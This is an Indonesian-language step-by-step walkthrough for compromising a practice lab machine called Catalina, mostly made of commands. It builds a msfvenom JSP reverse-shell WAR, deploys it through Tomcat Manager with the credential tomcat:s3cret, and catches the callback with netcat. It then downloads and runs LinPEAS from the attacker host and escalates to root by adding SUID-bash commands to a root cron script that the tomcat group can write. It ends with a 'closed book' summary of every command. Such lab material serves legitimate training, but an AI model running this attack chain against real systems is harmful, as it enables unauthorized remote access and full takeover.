# Alternatif Penyelesaian Lab Catalina Menggunakan LinPEAS

> **Ruang lingkup:** hanya digunakan pada laboratorium atau sistem yang telah memberikan izin pengujian.

## 1. Ringkasan

Alternatif penyelesaian Lab Catalina dilakukan dengan alur berikut:

```text
Tomcat Manager terekspos
→ credential Tomcat valid
→ membuat payload WAR menggunakan msfvenom
→ deploy payload melalui Tomcat Manager
→ memperoleh reverse shell sebagai user tomcat
→ menjalankan LinPEAS
→ menemukan root cron yang memanggil script writable
→ memodifikasi script cron
→ memperoleh akses root
```

Target lab:

```text
IP Target      : 192.168.56.117
Port Tomcat    : 8081
Hostname       : catalina
Credential     : tomcat:s3cret
User awal      : tomcat
Privilege akhir: root
```

---

# 2. Menentukan Variabel

Sesuaikan alamat IP Kali Linux dengan interface yang terhubung ke jaringan lab.

```bash
TARGET="192.168.56.117"
TOMCAT_PORT="8081"

LHOST="192.168.56.5"
LPORT="4444"

TOMCAT_USER="tomcat"
TOMCAT_PASS="s3cret"
APP_PATH="shell"
```

Periksa alamat IP Kali Linux:

```bash
ip -br addr
```

Pastikan target dapat dijangkau:

```bash
ping -c 4 "$TARGET"
```

---

# 3. Membuat Payload WAR

Buat payload reverse shell JSP menggunakan `msfvenom`:

```bash
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$LHOST" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

Verifikasi file:

```bash
ls -lh catalina-shell.war
file catalina-shell.war
```

Opsional, lihat isi file WAR:

```bash
unzip -l catalina-shell.war
```

Hal yang harus diperhatikan:

```text
LHOST harus menggunakan IP Kali Linux.
LPORT harus sama dengan port listener.
Format payload harus WAR.
```

---

# 4. Menjalankan Listener

Buka terminal baru pada Kali Linux:

```bash
nc -lvnp "$LPORT"
```

Contoh tanpa variabel:

```bash
nc -lvnp 4444
```

Listener harus aktif sebelum payload dipanggil.

---

# 5. Deploy Payload ke Tomcat Manager

Upload dan deploy file WAR melalui Tomcat Manager text interface:

```bash
curl -u "$TOMCAT_USER:$TOMCAT_PASS" \
  --upload-file catalina-shell.war \
  "http://$TARGET:$TOMCAT_PORT/manager/text/deploy?path=/$APP_PATH&update=true"
```

Hasil yang diharapkan:

```text
OK - Deployed application at context path [/shell]
```

Periksa daftar aplikasi:

```bash
curl -u "$TOMCAT_USER:$TOMCAT_PASS" \
  "http://$TARGET:$TOMCAT_PORT/manager/text/list"
```

Cari baris berikut:

```text
/shell:running
```

---

# 6. Memicu Reverse Shell

Panggil aplikasi yang telah dideploy:

```bash
curl "http://$TARGET:$TOMCAT_PORT/$APP_PATH/"
```

Contoh:

```bash
curl "http://192.168.56.117:8081/shell/"
```

Periksa terminal listener. Jika berhasil, akan muncul koneksi dari target.

Verifikasi shell:

```bash
id
whoami
hostname
pwd
```

Hasil awal:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
catalina
/
```

## Jika `/shell/` tidak memicu reverse shell

Periksa nama file JSP di dalam WAR:

```bash
unzip -l catalina-shell.war
```

Misalnya ditemukan file:

```text
abc123.jsp
```

Panggil secara langsung:

```bash
curl "http://192.168.56.117:8081/shell/abc123.jsp"
```

---

# 7. Upgrade Shell

Pada shell target:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Kemudian tekan:

```text
Ctrl+Z
```

Pada terminal Kali:

```bash
stty raw -echo
fg
```

Tekan Enter, lalu jalankan:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

Alternatif jika Python tidak tersedia:

```bash
script -qc /bin/bash /dev/null
```

---

# 8. Menemukan LinPEAS pada Kali Linux

Cari lokasi `linpeas.sh`:

```bash
find /usr/share -name linpeas.sh 2>/dev/null
```

Lokasi yang umum:

```text
/usr/share/peass/linpeas/linpeas.sh
```

Masuk ke direktori LinPEAS:

```bash
cd /usr/share/peass/linpeas
ls -lh
```

---

# 9. Menjalankan HTTP Server pada Kali

Gunakan port yang berbeda dari listener reverse shell:

```bash
python3 -m http.server 8089
```

Alternatif tanpa berpindah direktori:

```bash
python3 -m http.server 8089 \
  --directory /usr/share/peass/linpeas
```

Server akan aktif pada:

```text
http://IP_KALI:8089
```

---

# 10. Mengunduh LinPEAS pada Target

Pada shell target:

```bash
cd /tmp
wget "http://$LHOST:8089/linpeas.sh"
```

Contoh:

```bash
cd /tmp
wget http://192.168.56.5:8089/linpeas.sh
```

Alternatif menggunakan `curl`:

```bash
curl -o /tmp/linpeas.sh \
  "http://192.168.56.5:8089/linpeas.sh"
```

Verifikasi:

```bash
ls -lh /tmp/linpeas.sh
```

Berikan permission execute:

```bash
chmod +x /tmp/linpeas.sh
```

---

# 11. Menjalankan LinPEAS

Jalankan LinPEAS dan simpan output:

```bash
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

Alternatif tanpa menampilkan output di terminal:

```bash
/tmp/linpeas.sh > /tmp/linpeas.out 2>&1
```

Cari temuan yang berkaitan dengan cron dan file writable:

```bash
grep -Ei \
  'cron|writable|backup.sh|root.*tomcat|rwxrwx' \
  /tmp/linpeas.out
```

LinPEAS hanya membantu enumerasi. Semua temuan tetap harus divalidasi secara manual.

---

# 12. Validasi Temuan Cron

Periksa konfigurasi cron:

```bash
cat /etc/cron.d/backup
```

Hasil:

```cron
* * * * * root /opt/backup/backup.sh
```

Artinya, setiap menit sistem menjalankan:

```text
/opt/backup/backup.sh
```

sebagai user `root`.

Periksa permission script:

```bash
ls -lah /opt/backup/backup.sh
stat -c '%A %U %G %n' /opt/backup/backup.sh
```

Hasil:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Periksa identitas user saat ini:

```bash
id
groups
```

Karena shell berjalan sebagai user dan group `tomcat`, sedangkan script memiliki permission write untuk group `tomcat`, maka user `tomcat` dapat mengubah script tersebut.

---

# 13. Backup Script Asli

Sebelum melakukan perubahan, backup script:

```bash
cp /opt/backup/backup.sh /tmp/backup.sh.original
```

Verifikasi:

```bash
ls -lh /tmp/backup.sh.original
```

---

# 14. Proof of Privilege Escalation

Tambahkan command pembuktian:

```bash
printf '\nid > /tmp/root_proof\n' \
  >> /opt/backup/backup.sh
```

Periksa isi script:

```bash
tail -n 5 /opt/backup/backup.sh
```

Tunggu sekitar satu menit:

```bash
sleep 70
```

Periksa hasil:

```bash
cat /tmp/root_proof
ls -l /tmp/root_proof
```

Hasil yang diharapkan:

```text
uid=0(root) gid=0(root) groups=0(root)
-rw-r--r-- 1 root root ... /tmp/root_proof
```

Hal ini membuktikan bahwa command yang ditulis oleh user `tomcat` dieksekusi sebagai `root` oleh cron.

---

# 15. Mendapatkan Root Shell

Tambahkan command untuk membuat salinan Bash dengan bit SUID:

```bash
cat >> /opt/backup/backup.sh <<'PAYLOAD'

cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
PAYLOAD
```

Tunggu cron:

```bash
sleep 70
```

Periksa permission file:

```bash
ls -lah /tmp/rootbash
```

Hasil yang diharapkan:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Jalankan Bash dengan mempertahankan effective UID:

```bash
/tmp/rootbash -p
```

Verifikasi:

```bash
id
whoami
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) euid=0(root)
root
```

Parameter `-p` diperlukan agar Bash mempertahankan privilege dari bit SUID.

---

# 16. Cleanup

## Memulihkan script cron

Dari root shell:

```bash
install \
  -o root \
  -g tomcat \
  -m 0775 \
  /tmp/backup.sh.original \
  /opt/backup/backup.sh
```

Verifikasi:

```bash
cat /opt/backup/backup.sh
stat -c '%A %U %G %n' /opt/backup/backup.sh
```

Hapus artefak pengujian:

```bash
rm -f \
  /tmp/rootbash \
  /tmp/root_proof \
  /tmp/linpeas.sh \
  /tmp/linpeas.out \
  /tmp/backup.sh.original
```

## Undeploy payload WAR

Dari Kali Linux:

```bash
curl -u "$TOMCAT_USER:$TOMCAT_PASS" \
  "http://$TARGET:$TOMCAT_PORT/manager/text/undeploy?path=/$APP_PATH"
```

Hasil yang diharapkan:

```text
OK - Undeployed application at context path [/shell]
```

Hapus file WAR lokal:

```bash
rm -f catalina-shell.war
```

---

# 17. Troubleshooting

## Reverse shell tidak masuk

Periksa hal berikut:

```text
LHOST menggunakan IP interface Kali yang benar.
LPORT pada msfvenom sama dengan listener.
Listener sudah aktif sebelum payload dipanggil.
Firewall Kali tidak memblokir port listener.
Target dapat menjangkau IP Kali.
Nama JSP di dalam WAR mungkin perlu dipanggil langsung.
```

Uji konektivitas dari target menuju Kali:

```bash
curl http://192.168.56.5:8089/
```

## LinPEAS tidak dapat diunduh

Periksa HTTP server pada Kali:

```bash
ss -lntp | grep 8089
```

Periksa file:

```bash
ls -lh /usr/share/peass/linpeas/linpeas.sh
```

Jalankan HTTP server dari direktori yang benar:

```bash
python3 -m http.server 8089 \
  --directory /usr/share/peass/linpeas
```

## `rootbash -p` tidak menghasilkan root

Periksa permission:

```bash
ls -l /tmp/rootbash
```

Bit SUID harus terlihat sebagai huruf `s`:

```text
-rwsr-xr-x
```

Periksa owner:

```bash
stat -c '%A %U %G %n' /tmp/rootbash
```

Hasil yang benar:

```text
-rwsr-xr-x root root /tmp/rootbash
```

---

# 18. Ringkasan Closed Book

```bash
# KALI — membuat payload
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.56.5 \
  LPORT=4444 \
  -f war \
  -o shell.war

# KALI — listener
nc -lvnp 4444

# KALI — deploy WAR
curl -u tomcat:s3cret \
  --upload-file shell.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/shell&update=true"

# KALI — trigger
curl http://192.168.56.117:8081/shell/

# KALI — HTTP server LinPEAS
cd /usr/share/peass/linpeas
python3 -m http.server 8089

# TARGET — download dan jalankan LinPEAS
cd /tmp
wget http://192.168.56.5:8089/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out

# TARGET — validasi cron
cat /etc/cron.d/backup
stat -c '%A %U %G %n' /opt/backup/backup.sh

# TARGET — backup script
cp /opt/backup/backup.sh /tmp/backup.sh.original

# TARGET — proof root
printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh
sleep 70
cat /tmp/root_proof

# TARGET — membuat SUID Bash
printf '\ncp /bin/bash /tmp/rootbash\nchown root:root /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' \
  >> /opt/backup/backup.sh

sleep 70
/tmp/rootbash -p
id
whoami
```

---

# 19. Mnemonic

```text
M-D-L-L-C-R
```

```text
M = Msfvenom
D = Deploy WAR
L = Listener
L = LinPEAS
C = Cron writable
R = Root
```

---

# 20. Kesimpulan

LinPEAS membantu mempercepat enumerasi privilege escalation pada Lab Catalina. Temuan utama adalah root cron yang menjalankan `/opt/backup/backup.sh` setiap menit, sementara script tersebut dapat ditulis oleh group `tomcat`.

Rangkaian akhir:

```text
Tomcat Manager
→ WAR reverse shell
→ user tomcat
→ LinPEAS
→ writable root cron script
→ SUID Bash
→ root
```
